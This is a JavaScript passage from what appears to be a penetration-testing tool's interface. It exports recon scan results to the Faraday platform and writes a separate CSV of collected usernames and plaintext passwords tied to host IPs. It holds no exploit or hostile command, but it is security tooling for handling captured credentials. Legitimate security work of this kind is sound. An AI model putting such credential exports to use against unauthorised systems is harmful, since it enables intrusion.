        params: params.trim(),
        import_source: 'report',
        start_date: _isoNoMs(t0),
        end_date:   _isoNoMs(t1),
      },
      hosts: hostArr,
    };
  });
}

function _isoNoMs(d) { return d.toISOString().replace(/\.\d{3}Z$/, ''); }

// Faraday's `faraday_json` plugin silently DROPS credential arrays on import
// (see faraday_plugins/plugins/repo/faraday_json/plugin.py:38 & :48 —
// `host.pop('credentials', '')`). Credentials must be re-imported via the
// separate `faradaycredential_csv` plugin, which auto-detects by header. We
// therefore emit two files per export: the main JSON and a credentials CSV.
// The CSV is uploaded with the same `faraday-cli tool report` command — the
// plugin is selected automatically from the header row.
function _faradayCsvEscape(v) {
  v = String(v == null ? '' : v);
  // Always quote and double-up internal quotes — handles commas, newlines,
  // values containing quote chars. Safe default; no need to be clever.
  return '"' + v.replace(/"/g, '""') + '"';
}

function _faradayBuildCredentialsCsv(payload) {
  // Header must match faradaycredential_csv plugin's column names (username,
  // password, endpoint) so the plugin auto-detects. We prefix endpoint with
  // the host IP so the operator can trace each credential back to its source
  // host in Faraday — the CSV plugin imports creds without host attribution,
  // so this string is the only provenance left.
  const lines = ['username,password,endpoint'];
  let count = 0;
  payload.hosts.forEach(h => {
    (h.credentials || []).forEach(c => {
      const username = c.username || c.name || '';
      const password = c.password || '';
      // Skip empty-password creds — CSV plugin requires both username AND
      // password to be non-empty (plugin.py:138). Pushing them would just
      // silently drop them again.
      if (!username || !password) return;
      const endpoint = (h.ip ? h.ip + ' :: ' : '') + (c.endpoint || '') +
                       (c.name && c.name !== username ? ' (' + c.name + ')' : '');
      lines.push([username, password, endpoint].map(_faradayCsvEscape).join(','));
      count++;
    });
  });
  return { csv: lines.join('\n') + '\n', count };
}

function _faradayDownloadBlob(blob, filename) {
  const a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  setTimeout(() => { URL.revokeObjectURL(a.href); a.remove(); }, 500);
}

function _faradayDownloadJson(payload, filename) {
  _faradayDownloadBlob(new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' }), filename);
}

// Two-file download. Returns the credential count for the toast.
// Per-scan exports (faradayExportScan) skip _faradayApplyDiag, so they have
// zero credentials and the CSV download is correctly suppressed by count==0.
// Only diag / full exports trigger the second download.
function _faradayDownloadPair(payload, jsonName, csvName) {
  _faradayDownloadJson(payload, jsonName);
  const { csv, count } = _faradayBuildCredentialsCsv(payload);
  if (count > 0) {
    // Small delay so browsers don't merge the two downloads into one prompt
    // — Firefox in particular collapses near-simultaneous downloads.
    setTimeout(() => {
      _faradayDownloadBlob(new Blob([csv], { type: 'text/csv' }), csvName);
    }, 300);
  }
  return count;
}

function _faradayToast(payload, csvCount, csvName, jsonName) {
  const hosts = payload.hosts.length;
  let svc = 0;
  payload.hosts.forEach(h => { svc += (h.services || []).length; });
  const msg = [
    'Faraday export: ' + hosts + ' hosts, ' + svc + ' services, ' + csvCount + ' credentials.',
    '',
    'Recon only — no Vulnerability entities are emitted.',
    '',
    'Upload the JSON:',
    '  faraday-cli tool report ' + (jsonName || '<json>') + ' --plugin-id Faraday_JSON',
  ];
  if (csvCount > 0) {
    msg.push('');
    msg.push('Credentials (' + csvName + '): import via Faraday UI →');
    msg.push('Credentials view → "Import CSV" button. faraday-cli cannot');
    msg.push('import credentials (server bulk_create has no credentials field).');
  }
  alert(msg.join('\n'));
}

function _faradayFilename(cmd, ext) {
  const cfg = _faradayCfg();
  const ws = (cfg.workspace || 'workspace').replace(/[^a-z0-9_-]/gi, '_');
  return 'shells-x-' + cmd + '-' + ws + '-' + Math.floor(Date.now() / 1000) + '.' + (ext || 'json');
}

function faradayExportScan(scanId) {
  if (!_faradayRequireWorkspace()) return;
  faradayBuildPayload({ scanIds: [scanId] }).then(payload => {
    if (!payload.hosts.length) { alert('No open ports in that scan to export.'); return; }
    const jsonName = _faradayFilename('scan', 'json');
    const csvName  = _faradayFilename('scan-credentials', 'csv');
    const count = _faradayDownloadPair(payload, jsonName, csvName);
    _faradayToast(payload, count, csvName, jsonName);
  }).catch(err => alert('Export failed: ' + err));
}

function faradayExportDiag() {
  if (!_faradayRequireWorkspace()) return;
  if (!window._lastDiagBlob) {
    alert('Run a Diagnostics refresh first (no cached diag blob).');
    return;
  }
  faradayBuildPayload({ includeDiag: true }).then(payload => {
    if (!payload.hosts.length) { alert('Nothing exportable in the diagnostics blob.'); return; }
    const jsonName = _faradayFilename('diag', 'json');
    const csvName  = _faradayFilename('diag-credentials', 'csv');
    const count = _faradayDownloadPair(payload, jsonName, csvName);
    _faradayToast(payload, count, csvName, jsonName);
  }).catch(err => alert('Export failed: ' + err));
}

function faradayExportAll() {
  if (!_faradayRequireWorkspace()) return;
  faradayBuildPayload({ includeAll: true, includeDiag: true }).then(payload => {
    if (!payload.hosts.length) { alert('No data to export yet. Run a scan or diagnostics first.'); return; }
    const jsonName = _faradayFilename('full', 'json');
    const csvName  = _faradayFilename('full-credentials', 'csv');
    const count = _faradayDownloadPair(payload, jsonName, csvName);
    _faradayToast(payload, count, csvName, jsonName);
  }).catch(err => alert('Export failed: ' + err));
}

// Populate the settings inputs from localStorage as soon as the DOM is ready,
// and bind the click-outside / Esc handlers for the dropdown panel.
function _faradayInit() { faradayLoadSettings(); _faradayBindOutsideClose(); }
if (document.readyState !== 'loading') _faradayInit();
else document.addEventListener('DOMContentLoaded', _faradayInit);

